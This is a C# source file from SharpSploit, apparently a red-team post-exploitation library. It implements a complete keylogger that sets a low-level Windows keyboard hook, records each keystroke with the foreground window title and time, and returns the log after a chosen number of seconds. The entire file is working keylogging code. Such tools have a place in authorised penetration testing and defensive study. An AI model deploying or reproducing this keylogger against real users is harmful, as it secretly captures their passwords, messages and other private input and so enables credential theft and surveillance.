// Author: Scottie Austin @Checkymander
// Project: SharpSploit (https://github.com/cobbr/SharpSploit)
// License: BSD 3-Clause

using System;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using System.Diagnostics;
using SharpSploit.Execution;
using System.Runtime.InteropServices;

namespace SharpSploit.Monitoring
{
    /// <summary>
    /// Keylogger allows for the monitoring of user keystrokes.
    /// </summary>
    public class Keylogger
    {
        public const int WH_KEYBOARD_LL = 13;
        public const int WM_KEYDOWN = 0x0100;
        public static Win32.User32.LowLevelKeyboardProc proc = HookCallback;
        public static IntPtr hookID = IntPtr.Zero;
        public static string oldWindow = "";
        public static System.Timers.Timer timer = null;
        public static StringBuilder builder = new StringBuilder();

        /// <summary>
        /// Starts the Keylogger
        /// </summary>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <returns>String containing the captured keystrokes, along with identification of what window they were entered in.</returns>
        /// <param name="time">The amount of time in seconds the keylogger should run for before returning keystrokes.</param>
        public static string Start(int time)
        {
            builder.Append(String.Format("Starting keylogger for {0} seconds.", time));
            hookID = SetHook(proc);
            timer = new System.Timers.Timer(time * 1000);
            timer.Elapsed += OnTimedEvent;
            timer.Enabled = true;
            Application.Run();
            return builder.ToString();
        }
        /// <summary>
        /// Closes the keylogger when the alotted time has been reached.
        /// </summary>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <returns>null</returns>
        public static void OnTimedEvent(Object source, ElapsedEventArgs e)
        {
            builder.AppendLine(String.Format("\r\n\r\nFinished Keylogger at {0:HH:mm:ss.fff}", e.SignalTime));
            Win32.User32.UnhookWindowsHookEx(hookID);
            timer.Stop();
            timer.Dispose();
            Application.Exit();
        }
        /// <summary>
        /// Sets the keylogging hook
        /// </summary>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <returns>IntPtr pointing to the keyboard hook.</returns>
        public static IntPtr SetHook(Win32.User32.LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return Win32.User32.SetWindowsHookEx(WH_KEYBOARD_LL, proc, Win32.Kernel32.GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        /// <summary>
        /// Called when a key is pressed.
        /// </summary>
        /// <author>Scottie Austin (@checkymander)</author>
        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            var window = GetActiveWindowTitle();
            if (window != oldWindow)
            {
                builder.Append("\r\n");
                oldWindow = window;
                builder.Append("\r\n" + DateTime.Now + "\r\n" + window + "\r\n--------------------------\r\n");
            }
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                
                //Large switch statement to pretty up the output.
                switch ((Keys)vkCode)
                {
                    case Keys.Attn:
                        builder.Append("[Attn]");
                        break;
                    case Keys.Clear:
                        builder.Append("[Clear]");
                        break;
                    case Keys.Down:
                        builder.Append("[Down Arrow]");
                        break;
                    case Keys.Up:
                        builder.Append("[Up Arrow]");
                        break;
                    case Keys.Left:
                        builder.Append("[Left Arrow]");
                        break;
                    case Keys.Right:
                        builder.Append("[Right Arrow]");
                        break;
                    case Keys.Escape:
                        builder.Append("[ESC]");
                        break;
                    case Keys.Tab:
                        builder.Append("[Tab]");
                        break;
                    case Keys.LWin:
                        builder.Append("[LeftWinKey]");
                        break;
                    case Keys.RWin:
                        builder.Append("[RightWinKey]");
                        break;
                    case Keys.PrintScreen:
                        builder.Append("[PrtScrn]");
                        break;
                    case Keys.D0:
                        if (isShift()) { builder.Append(")"); }
                        else { builder.Append("0"); }
                        break;
                    case Keys.D1:
                        if (isShift()) { builder.Append("!"); }
                        else { builder.Append("1"); }
                        break;
                    case Keys.D2:
                        if (isShift()) { builder.Append("@"); }
                        else { builder.Append("2"); }
                        break;
                    case Keys.D3:
                        if (isShift()) { builder.Append("#"); }
                        else { builder.Append("3"); }
                        break;
                    case Keys.D4:
                        if (isShift()) { builder.Append("$"); }
                        else { builder.Append("4"); }
                        break;
                    case Keys.D5:
                        if (isShift()) { builder.Append("%"); }
                        else { builder.Append("5"); }
                        break;
                    case Keys.D6:
                        if (isShift()) { builder.Append("^"); }
                        else { builder.Append("6"); }
                        break;
                    case Keys.D7:
                        if (isShift()) { builder.Append("&"); }
                        else { builder.Append("7"); }
                        break;
                    case Keys.D8:
                        if (isShift()) { builder.Append("*"); }
                        else { builder.Append("8"); }
                        break;
                    case Keys.D9:
                        if (isShift()) { builder.Append("("); }
                        else { builder.Append("9"); }
                        break;
                    case Keys.Space:
                        builder.Append(" ");
                        break;
                    case Keys.NumLock:
                        builder.Append("[NumLock]");
                        break;
                    case Keys.Alt:
                        builder.Append("[Alt]");
                        break;
                    case Keys.LControlKey:
                        builder.Append("[LeftControl]");
                        break;
                    case Keys.RControlKey:
                        builder.Append("[RightControl]");
                        break;
                    case Keys.CapsLock:
                        builder.Append("[CapsLock]");
                        break;
                    case Keys.Delete:
                        builder.Append("[Delete]");
                        break;
                    case Keys.Enter:
                        builder.Append("[Enter]");
                        break;
                    case Keys.Divide:
                        builder.Append("/");
                        break;
                    case Keys.Multiply:
                        builder.Append("*");
                        break;
                    case Keys.Add:
                        builder.Append("+");
                        break;
                    case Keys.Subtract:
                        builder.Append("-");
                        break;
                    case Keys.PageDown:
                        builder.Append("[PG DWN]");
                        break;
                    case Keys.PageUp:
                        builder.Append("[PG UP]");
                        break;
                    case Keys.End:
                        builder.Append("[END]");
                        break;
                    case Keys.Insert:
                        builder.Append("[INSERT]");
                        break;
                    case Keys.Decimal:
                        builder.Append(".");
                        break;
                    case Keys.OemSemicolon:
                        if (isShift()) { builder.Append(":"); }
                        else { builder.Append(";"); }
                        break;
                    case Keys.Oemtilde:
                        if (isShift()) { builder.Append("~"); }
                        else { builder.Append("`"); }
                        break;
                    case Keys.Oemplus:
                        if (isShift()) { builder.Append("+"); }
                        else { builder.Append("="); }
                        break;
                    case Keys.OemMinus:
                        if (isShift()) { builder.Append("_"); }
                        else { builder.Append("-"); }
                        break;
                    case Keys.Oemcomma:
                        if (isShift()) { builder.Append("<"); }
                        else { builder.Append(","); }
                        break;
                    case Keys.OemPeriod:
                        if (isShift()) { builder.Append(">"); }
                        else { builder.Append("."); }
                        break;
                    case Keys.OemQuestion:
                        if (isShift()) { builder.Append("?"); }
                        else { builder.Append("/"); }
                        break;
                    case Keys.OemPipe:
                        if (isShift()) { builder.Append("|"); }
                        else { builder.Append("\\"); }
                        break;
                    case Keys.OemQuotes:
                        if (isShift()) { builder.Append("\""); }
                        else { builder.Append("'"); }
                        break;
                    case Keys.OemCloseBrackets:
                        if (isShift()) { builder.Append("]"); }
                        else { builder.Append("}"); }
                        break;
                    case Keys.OemOpenBrackets:
                        if (isShift()) { builder.Append("["); }
                        else { builder.Append("{"); }
                        break;
                    case Keys.Home:
                        builder.Append("[Home]");
                        break;
                    case Keys.Back:
                        builder.Append("[Backspace]");
                        break;
                    case Keys.NumPad0:
                        builder.Append("0");
                        break;
                    case Keys.NumPad1:
                        builder.Append("1");
                        break;
                    case Keys.NumPad2:
                        builder.Append("2");
                        break;
                    case Keys.NumPad3:
                        builder.Append("3");
                        break;
                    case Keys.NumPad4:
                        builder.Append("4");
                        break;
                    case Keys.NumPad5:
                        builder.Append("5");
                        break;
                    case Keys.NumPad6:
                        builder.Append("6");
                        break;
                    case Keys.NumPad7:
                        builder.Append("7");
                        break;
                    case Keys.NumPad8:
                        builder.Append("8");
                        break;
                    case Keys.NumPad9:
                        builder.Append("9");
                        break;
                    case Keys.LShiftKey:
                    //    builder.Append("[Shift]");
                        break;
                    case Keys.RShiftKey:
                    //    builder.Append("[Shift]");
                        break;
                    default:
                        Keys t = (Keys)vkCode;
                        var isCapslock = isCapsLock();
                        if (isCapslock && isShift()) { builder.Append(t.ToString().ToLower()); }
                        else if (isCapslock && !isShift()) { builder.Append(t.ToString().ToUpper()); }
                        else if (!isCapslock && isShift()) { builder.Append(t.ToString().ToUpper()); }
                        else { builder.Append(t.ToString().ToLower()); }
                        break;
                }
            }
            return Win32.User32.CallNextHookEx(hookID, nCode, wParam, lParam);
        }
        /// <summary>
        /// Gets the active window title of the window keystrokes are being entered in.
        /// </summary>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <returns>Title of the active window.</returns>
        static string GetActiveWindowTitle()
        {
            const int c = 256;
            StringBuilder b = new StringBuilder(c);
            IntPtr handle = Win32.User32.GetForegroundWindow();

            if (Win32.User32.GetWindowText(handle, b, c) > 0)
            {
                return b.ToString();
            }
            return null;
        }
        /// <summary>
        /// Checks if Shift is pressed.
        /// </summary>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <returns>True if shift is pressed, False if not.</returns>
        public static bool isShift()
        {
            int curState = Win32.User32.GetKeyState(160);
            int curState2 = Win32.User32.GetKeyState(161);
            if(curState < 0 || curState2 < 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        /// <summary>
        /// Checks if Caps Lock is currently on.
        /// </summary>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <returns>True if Caps Lock is on, False if not.</returns>
        public static bool isCapsLock()
        {
            if (Win32.User32.GetKeyState(20) != 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}
